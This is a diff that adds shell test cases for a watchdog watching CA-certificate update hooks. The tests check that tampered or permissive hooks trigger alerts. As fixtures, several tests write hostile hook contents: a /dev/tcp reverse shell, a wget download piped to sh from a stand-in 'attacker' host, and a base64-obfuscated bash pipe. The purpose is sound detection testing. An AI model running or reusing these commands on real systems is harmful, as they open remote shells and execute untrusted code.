@@ -119,3 +119,69 @@ seed_benign() {
     [ "${status}" -ne 0 ]
     cap | grep -q '"severity":"alert"'
 }
+
+@test "baseline is chmod 0600 (confidentiality — ca-cert hook inventory enumerates root-exec-on-trust-rebuild surface)" {
+    seed_benign
+    run_wd
+    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
+}
+
+@test "INVARIANT (reverse-shell pattern): /dev/tcp reverse shell in hook → alert" {
+    seed_benign
+    run_wd
+    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD}/jks-keystore"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (wget-pipe-sh): wget bootstrap variant in hook → alert" {
+    seed_benign
+    run_wd
+    printf '#!/bin/sh\nwget -qO- http://attacker/p | sh\n' > "${HOOKD}/jks-keystore"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (base64-decode-pipe): obfuscation variant in hook → alert" {
+    seed_benign
+    run_wd
+    printf '#!/bin/sh\necho YmFzaCAtaQ== | base64 -d | bash\n' > "${HOOKD}/jks-keystore"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (group-writable hook): group-writable → alert above world-writable" {
+    seed_benign
+    run_wd
+    chmod 0664 "${HOOKD}/jks-keystore"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
+
+@test "INVARIANT (pre-existing world-writable hook): baseline_initial fires alert at install-time" {
+    seed_benign
+    chmod 0666 "${HOOKD}/jks-keystore"
+    run_wd
+    cap | grep -q '"event":"baseline_initial"'
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
+
+@test "DELTA detect — ADDED hook (attacker drops a new update.d hook) surfaces in sample" {
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\necho "new"\n' > "${HOOKD}/distinctive-attacker-hook"
+    run_wd
+    cap | grep -q 'distinctive-attacker-hook'
+}
+
+@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
+    seed_benign
+    run_wd
+    main_count=$(cap | grep -cE '^-t selfdef-cacert-hooks -- ')
+    [ "${main_count}" = "1" ]
+}
